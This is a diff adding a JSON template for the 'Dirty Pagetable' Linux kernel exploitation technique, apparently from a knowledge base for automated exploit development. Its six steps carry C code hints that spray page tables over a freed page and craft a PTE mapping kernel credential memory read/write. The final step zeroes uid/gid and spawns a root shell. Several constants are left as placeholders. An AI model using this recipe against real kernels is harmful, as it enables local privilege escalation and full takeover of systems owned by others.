@@ -1,0 +1,51 @@
+{
+  "name": "dirty_pagetable",
+  "description": "Page-level UAF exploited via the Dirty Pagetable technique. After freeing a page-sized object, allocate user page tables (PTEs) on the freed page. Corrupt PTE entries to map arbitrary physical memory, then overwrite kernel credential structures via the physical mapping.",
+  "target_struct": "pte (page table entry)",
+  "slab_cache": "page_alloc (order-0 pages)",
+  "technique": "dirty_pagetable",
+  "vuln_types": ["uaf", "double-free"],
+  "kernel_versions": "5.4+ (best on 5.15+)",
+  "detection_rules": {
+    "required_symbols": ["mmap", "munmap", "fork", "userfaultfd"],
+    "crash_functions": ["__free_pages", "free_pages", "put_page", "__page_cache_release"],
+    "slab_caches": ["page allocator"],
+    "struct_fields": ["pte_t", "page.flags", "page._refcount"]
+  },
+  "steps": [
+    {
+      "name": "trigger_uaf",
+      "description": "Trigger the page-level use-after-free. The object must be backed by full pages (not slab cache objects). Compound pages or page-cache pages are common targets.",
+      "code_hint": "// Free the page while a reference survives\n// Some CVEs free the backing pages of a mapped vmalloc region"
+    },
+    {
+      "name": "free_page",
+      "description": "Ensure the freed page is returned to the buddy allocator. May need to drain the PCP (per-cpu page) cache first.",
+      "code_hint": "// Drain PCP caches to push page to buddy\n// Technique: alloc then free many order-0 pages\n#define DRAIN_COUNT 4096\nvoid *pages[DRAIN_COUNT];\nfor (int i = 0; i < DRAIN_COUNT; i++)\n    pages[i] = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);\nfor (int i = 0; i < DRAIN_COUNT; i++)\n    munmap(pages[i], 0x1000);"
+    },
+    {
+      "name": "allocate_page_tables_on_freed_page",
+      "description": "Force the kernel to allocate page table pages (PTE table = 4KB) on the freed physical page. Done by mmap'ing a large virtual region and faulting in pages at 2MB intervals to create new PTE tables.",
+      "code_hint": "#define PTE_SPRAY_SIZE (256UL * 1024 * 1024)  // 256MB\nvoid *spray_base = mmap(NULL, PTE_SPRAY_SIZE, PROT_READ|PROT_WRITE,\n                        MAP_PRIVATE|MAP_ANON|MAP_POPULATE, -1, 0);\n// Each 2MB of virtual space = 1 PTE page (512 entries * 8 bytes = 4KB)\n// Touch one page per 2MB to force PTE allocation\nfor (size_t off = 0; off < PTE_SPRAY_SIZE; off += 0x200000)\n    *(volatile char *)(spray_base + off) = 'X';"
+    },
+    {
+      "name": "corrupt_pte",
+      "description": "Use the dangling pointer to the freed page to corrupt PTE entries. Set the PTE to map a target physical address (e.g., physmap of current task cred, or kernel text for code read).",
+      "code_hint": "// PTE format (x86_64): [NX:63][addr:51:12][flags:11:0]\n// Set PTE to map target physical page with RW permissions\n#define PTE_PRESENT  (1UL << 0)\n#define PTE_RW       (1UL << 1)\n#define PTE_USER     (1UL << 2)\n#define PTE_ACCESSED (1UL << 5)\n#define PTE_DIRTY    (1UL << 6)\nunsigned long target_phys = CRED_PHYS_ADDR & ~0xFFFUL;\nunsigned long crafted_pte = target_phys | PTE_PRESENT | PTE_RW | PTE_USER | PTE_ACCESSED | PTE_DIRTY;"
+    },
+    {
+      "name": "map_physmem_via_pte",
+      "description": "Access the virtual address whose PTE was corrupted. This now maps to attacker-chosen physical memory, giving direct read/write access.",
+      "code_hint": "// The spray_base page whose PTE was corrupted now maps target_phys\n// Read/write through this virtual address to access kernel physical memory\nunsigned long *phys_window = (unsigned long *)(spray_base + corrupted_offset);\nprintf(\"Kernel data at phys 0x%lx: 0x%lx\\n\", target_phys, *phys_window);"
+    },
+    {
+      "name": "overwrite_cred_via_physmap",
+      "description": "Write to the mapped physical memory to overwrite the current process's cred structure (uid/gid = 0) or modprobe_path.",
+      "code_hint": "// Overwrite uid/gid/euid/egid to 0\nmemset(phys_window + CRED_UID_OFFSET/8, 0, 32);  // Zero out uid through fsgid\n\n// Verify\nif (getuid() == 0) {\n    printf(\"[+] Got root!\\n\");\n    execl(\"/bin/sh\", \"sh\", NULL);\n}"
+    }
+  ],
+  "references": [
+    "https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html",
+    "https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606"
+  ]
+}
